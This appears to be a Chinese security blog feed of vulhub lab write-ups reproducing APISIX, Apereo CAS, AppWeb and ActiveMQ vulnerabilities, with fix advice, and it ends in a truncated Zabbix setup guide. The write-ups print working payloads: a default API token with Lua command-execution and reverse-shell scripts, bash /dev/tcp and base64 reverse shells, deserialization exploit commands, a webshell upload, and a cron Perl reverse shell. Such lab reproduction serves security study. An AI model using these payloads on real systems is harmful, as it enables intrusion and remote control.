        <content type="html"><![CDATA[<h3 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token <code>edd1c9f034335f136f87ad84b625c8f1</code>，攻击者利用这个Token可以访问到管理员接口，进而通过<code>script</code>参数来插入任意LUA脚本并执行。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache APISIX 1.2</span><br><span class="line">Apache APISIX 1.3</span><br><span class="line">Apache APISIX 1.4</span><br><span class="line">Apache APISIX 1.5</span><br></pre></td></tr></table></figure><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="http://image.jh2ing.com/image-20220713134306426.png" alt="image-20220713134306426"></p><p>环境启动后，访问<code>http://your-ip:9080</code>即可查看到默认的404页面。</p><p><img src="http://image.jh2ing.com/image-20220713114523793.png" alt="image-20220713114523793"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问<code>http://your-ip:9080/apisix/admin/routes</code></p><p><img src="http://image.jh2ing.com/image-20220713152059058.png" alt="image-20220713152059058"></p><p>返回<code>failed to check token</code>，通过利用默认Token增加一个恶意的router，其中包含恶意LUA脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /apisix/admin/routes HTTP/1.1</span><br><span class="line">Host: your-ip:9080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">X-API-KEY: edd1c9f034335f136f87ad84b625c8f1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 406</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220713165438253.png" alt="image-20220713165438253"></p><p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p><p><img src="http://image.jh2ing.com/image-20220713152335203.png" alt="image-20220713152335203"></p><p><strong>反弹shell：</strong></p><p>编写LUA脚本</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M=&#123;&#125; </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span> </span><br><span class="line"> <span class="keyword">local</span> s=<span class="built_in">require</span>(<span class="string">&#x27;socket&#x27;</span>) </span><br><span class="line"> <span class="keyword">local</span> t=<span class="built_in">assert</span>(s.tcp()) </span><br><span class="line"> t:connect(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;端口&#x27;</span>) </span><br><span class="line"> <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span> </span><br><span class="line"> <span class="keyword">local</span> r,x=t:receive();<span class="keyword">local</span> f=<span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(r,<span class="string">&#x27;r&#x27;</span>)) </span><br><span class="line"> <span class="keyword">local</span> b=<span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>));t:send(b) </span><br><span class="line"> <span class="keyword">end</span> </span><br><span class="line"> f:<span class="built_in">close</span>();t:<span class="built_in">close</span>()  </span><br><span class="line"> <span class="keyword">end</span> </span><br><span class="line"> <span class="keyword">return</span> _M </span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/shell&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M=&#123;&#125; \n function _M.access(conf, ctx) \n local s=require(&#x27;socket&#x27;) \n local t=assert(s.tcp()) \n t:connect(&#x27;ip&#x27;,&#x27;端口&#x27;) \n while true do \n local r,x=t:receive();local f=assert(io.popen(r,&#x27;r&#x27;)) \n local b=assert(f:read(&#x27;*a&#x27;));t:send(b) \n end \n f:close();t:close()  \n end \n return _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220713165224995.png" alt="image-20220713165224995"></p><p>访问对应url反弹shell：</p><p><img src="http://image.jh2ing.com/image-20220713164526251.png" alt="image-20220713164526251"></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li><p>修改Apache APISIX配置文件中 conf&#x2F;config.yaml 的admin_key，禁止使用默认Token</p></li><li><p>若非必要，关闭Apache APISIX Admin API功能，或者增加IP访问限制</p></li><li><p>升级Apache APISIX 至最新版本</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apereo CAS 4.1 反序列化命令执行漏洞复现</title>
      <link href="/posts/60630/"/>
      <url>/posts/60630/</url>
      
        <content type="html"><![CDATA[<h3 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。Apereo CAS存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Apereo CAS &lt;&#x3D; 4.1.7 </p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="http://image.jh2ing.com/image-20220702172835955.png" alt="image-20220702172835955"></p><p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p><p><img src="http://image.jh2ing.com/image-20220702172902702.png" alt="image-20220702172902702"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>漏洞原理实际上是Webflow中使用了默认密钥<code>changeit</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression = true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ...</span><br></pre></td></tr></table></figure><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch /tmp/success&quot;</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220702173138357.png" alt="image-20220702173138357"></p><p>然后我们登录CAS并抓包，将Body中的<code>execution</code>值替换成上面生成的Payload发送：</p><p><img src="http://image.jh2ing.com/image-20220702173613099.png" alt="image-20220702173613099"></p><p>登录Apereo CAS，可见<code>touch /tmp/success</code>已成功执行：</p><p><img src="http://image.jh2ing.com/image-20220702173816165.png" alt="image-20220702173816165"></p><p>反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 对shell语句进行base64加密</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIu.....&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220702200352565.png" alt="image-20220702200352565"></p><p><img src="http://image.jh2ing.com/image-20220702200450867.png" alt="image-20220702200450867"></p><p><img src="http://image.jh2ing.com/image-20220702200557519.png" alt="image-20220702200557519"></p><blockquote><p>建议在base64加密时使用burp中的加密工具</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>修改Webflow中的默认密钥</li><li>升级到最新版</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AppWeb 漏洞复现</title>
      <link href="/posts/57611/"/>
      <url>/posts/57611/</url>
      
        <content type="html"><![CDATA[<h3 id="AppWeb认证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715）"></a>AppWeb认证绕过漏洞（CVE-2018-8715）</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C&#x2F;C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Appweb 7.0.2及早期版本</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="http://image.jh2ing.com/image-20220626194038634.png" alt="image-20220626194038634"></p><p>访问 <a href="http://your-ip:8080，需要输入账号密码。">http://your-ip:8080，需要输入账号密码。</a></p><p><img src="http://image.jh2ing.com/image-20220626194244114.png" alt="image-20220626194244114"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p><p>构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Digest username=admin</span><br></pre></td></tr></table></figure><p>因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：</p><p>设置这个session到浏览器，即可正常访问需要认证的页面：</p><p><img src="http://image.jh2ing.com/image-20220626201043100.png" alt="image-20220626201043100"></p><p>或者直接在登录界面输入账号，然后抓取数据包</p><p><img src="http://image.jh2ing.com/image-20220626201800103.png" alt="image-20220626201800103"></p><p><strong>Authorization</strong>仅保留<code>Digest username=admin</code></p><p><img src="http://image.jh2ing.com/image-20220626201943185.png" alt="image-20220626201943185"></p><p>然后forward：</p><p><img src="http://image.jh2ing.com/image-20220626202035980.png" alt="image-20220626202035980"></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>打补丁或者直接升级到最新版</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ActiveMQ漏洞复现</title>
      <link href="/posts/12315/"/>
      <url>/posts/12315/</url>
      
        <content type="html"><![CDATA[<h3 id="ActiveMQ-反序列化漏洞-CVE-2015-5254"><a href="#ActiveMQ-反序列化漏洞-CVE-2015-5254" class="headerlink" title="ActiveMQ 反序列化漏洞 (CVE-2015-5254)"></a>ActiveMQ 反序列化漏洞 (CVE-2015-5254)</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>​Apache ActiveMQ 5.13.0 之前的 5.x 版本安全漏洞，该程序造成的漏洞不限制代理中可以序列化的类。远程攻击者可以制作一个特殊的序列化Java Message Service (JMS) ObjectMessage 对象，利用该漏洞执行任意代码。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Apache ActiveMQ 5.x &lt; 5.13.0</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>均使用vulhub搭建</p><p><img src="http://image.jh2ing.com/image-20220618154315800.png" alt="image-20220618154315800"> </p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>下载<a href="https://github.com/matthiaskaiser/jmet">jmet</a>（The Java Message Exploitation Tool），在同一目录下创建<code>external</code>文件夹，使用<code>ysoserial</code>生成Payload发送到服务器端的61616端口 ，访问web管理页面并读取序列化消息，然后就可以触发漏洞。</p><blockquote><p>jmet是使用ysoserial生成Payload并发送（ysoserial自带jar，我们不需要重新下载），所以我们需要选择一个可以在ysoserial中使用的gadget，比如ROME </p></blockquote><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220618142041977.png" alt="image-20220618142041977"></p><p>此时，一个名为 event 的队列将被添加到目标 ActiveMQ 中。</p><p>可以访问<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=Event</code>以查看此队列中的所有消息。</p><p>（<strong>登录名&#x2F;密码：</strong> admin&#x2F;admin）：</p><p><img src="http://image.jh2ing.com/image-20220618142257550.png" alt="image-20220618142257550"></p><p><img src="http://image.jh2ing.com/image-20220618142337488.png" alt="image-20220618142337488"></p><p>单击此消息触发命令执行，这次进入容器<code>docker-compose exec activemq bash</code></p><p>可以看到&#x2F;tmp&#x2F;success已经创建成功，说明exploit成功：</p><p><img src="http://image.jh2ing.com/image-20220618142545079.png" alt="image-20220618142545079"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># bash</span><br><span class="line">bash -i &gt;/dev/tcp/your-ip/23333 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line"># bash64 编码</span><br><span class="line"></span><br><span class="line">YmFzaCAta..........</span><br><span class="line">bash -c &#123;echo,YmFzaCAta..........&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAta..........&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220618145422632.png" alt="image-20220618145422632"></p><p>监听端口</p><p><img src="http://image.jh2ing.com/image-20220618145751495.png" alt="image-20220618145751495"></p><p>单击消息触发命令执行，成功获取shell</p><p><img src="http://image.jh2ing.com/image-20220618150007572.png" alt="image-20220618150007572"></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>升级到最新版</li></ul><h3 id="ActiveMQ-任意文件写入漏洞-CVE-2016-3088"><a href="#ActiveMQ-任意文件写入漏洞-CVE-2016-3088" class="headerlink" title="ActiveMQ 任意文件写入漏洞 (CVE-2016-3088)"></a>ActiveMQ 任意文件写入漏洞 (CVE-2016-3088)</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>​2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088），这个漏洞出现在Fileserver应用中，漏洞原理其实很简单，就是fileserver支持写入文件（但不解析JSP），同时支持移动文件（MOVE请求）。因此，我们只需要写入一个文件，然后通过移动请求将其移动到任意位置，从而导致任意文件写入漏洞。</p><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>Apache ActiveMQ 5.0.0 - 5.13.2</p><h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="http://image.jh2ing.com/image-20220618154210761.png" alt="image-20220618154210761"></p><p><img src="http://image.jh2ing.com/image-20220618154354946.png" alt="image-20220618154354946"></p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul><li><strong>WebShell</strong></li></ul><p>Webshell需要写在Admin或者Api应用中，两个应用都需要登录才能访问。</p><p>默认的 ActiveMQ 帐户和密码是<code>admin</code>. 首先访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>查看ActiveMQ的绝对路径：</p><p><img src="http://image.jh2ing.com/image-20220618163852843.png" alt="image-20220618163852843"></p><p>上传Webshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/test.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220618165457416.png" alt="image-20220618165457416"></p><p>然后将其移至<code>/opt/activemq/webapps/api/s.jsp</code>Web 目录中的 API 文件夹 ( )：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/test.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/test.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220618170415700.png" alt="image-20220618170415700"></p><p>访问 Webshell（需要登录）：</p><p>localhost:8161&#x2F;api&#x2F;test.jsp</p><p><img src="http://image.jh2ing.com/image-20220618173435993.png" alt="image-20220618173435993"></p><ul><li><strong>编写crontab，自动化反向shell</strong></li></ul><p>首先上传cron配置文件（注意换行必须是<code>\n</code>，不是<code>\r\n</code>，否则crontab执行会失败）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/test1.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 245</span><br><span class="line"></span><br><span class="line">*/1 * * * * root /usr/bin/perl -e &#x27;use  Socket;$i=&quot;10.0.0.1&quot;;$p=21111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220618200435330.png" alt="image-20220618200435330"></p><p>将其移至<code>/etc/cron.d/root</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/test1.txt HTTP/1.1</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220618200755003.png" alt="image-20220618200755003"></p><p>等待反向shell：</p><p><img src="http://image.jh2ing.com/image-20220619110431746.png" alt="image-20220619110431746"></p><blockquote><p>注意：要求 ActiveMQ 以 root 身份运行，否则将无法写入 cron 文件。</p></blockquote><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><ul><li>升级至 5.14.0 及其以后版本</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7+zabbix5.x_监控交换机</title>
      <link href="/posts/18099/"/>
      <url>/posts/18099/</url>
      
        <content type="html"><![CDATA[<h3 id="RHEL-x2F-CentOS-7安装"><a href="#RHEL-x2F-CentOS-7安装" class="headerlink" title="RHEL&#x2F;CentOS 7安装"></a>RHEL&#x2F;CentOS 7安装</h3><p>从Zabbix 5.0版本开始，Zabbix前端需要PHP 7.2版或更高版本。</p><p>1.关闭防火墙和selinux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">sed -i &#x27;s/SELINUX=enforcing/SELINUX=disabled/&#x27; /etc/selinux/config</span><br><span class="line">reboot #重启</span><br></pre></td></tr></table></figure><p>2.安装zabbix rpm源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh https://mirrors.aliyun.com/zabbix/zabbix/5.0/rhel/7/x86_64/zabbix-release-5.0-1.el7.noarch.rpm</span><br><span class="line">sed -i &#x27;s#http://repo.zabbix.com#https://mirrors.aliyun.com/zabbix#&#x27; /etc/yum.repos.d/zabbix.repo</span><br><span class="line">yum clean all</span><br></pre></td></tr></table></figure><p>3.安装zabbix server </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zabbix-server-mysql zabbix-agent -y</span><br></pre></td></tr></table></figure><p>4.安装 Software Collections</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install centos-release-scl -y</span><br></pre></td></tr></table></figure><p>5.启用 zabbix 前端源，修改<code>vi /etc/yum.repos.d/zabbix.repo</code>，将[zabbix-frontend]下的 enabled 改为 1</p><p>enabled&#x3D;1，过<code>yum</code>搜索<code>Zabbix</code>将返回<code>zabbix-web</code>包和四个新包。 这四个包是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zabbix-nginx-conf-scl.noarch : Nginx的Zabbix前端配置 (scl 版本)</span><br><span class="line">zabbix-web-deps-scl.noarch : 用于从redhat软件集合安装zabbix-web包所需PHP依赖项的便利包</span><br><span class="line">zabbix-web-mysql-scl.noarch : 用于MySQL数据库的Zabbix web前端包 (scl 版本)</span><br><span class="line">zabbix-web-pgsql-scl.noarch : 用于PostgreSQL数据库的Zabbix web前端包(scl 版本)</span><br></pre></td></tr></table></figure><blockquote><p>在安装MySQL数据库所需的<code>zabbix-web-mysql-scl</code>或者 PostgreSQL数据库所需的<code>zabbix-web-pgsql-scl</code>. 取决于Web服务器的需要，也请安装<code>zabbix-apache-conf-scl</code> 或者 <code>zabbix-nginx-conf-scl</code></p></blockquote><p>6.安装 zabbix 前端和相关环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zabbix-web-mysql-scl zabbix-apache-conf-scl -y</span><br></pre></td></tr></table></figure><p>7.安装mariadb数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 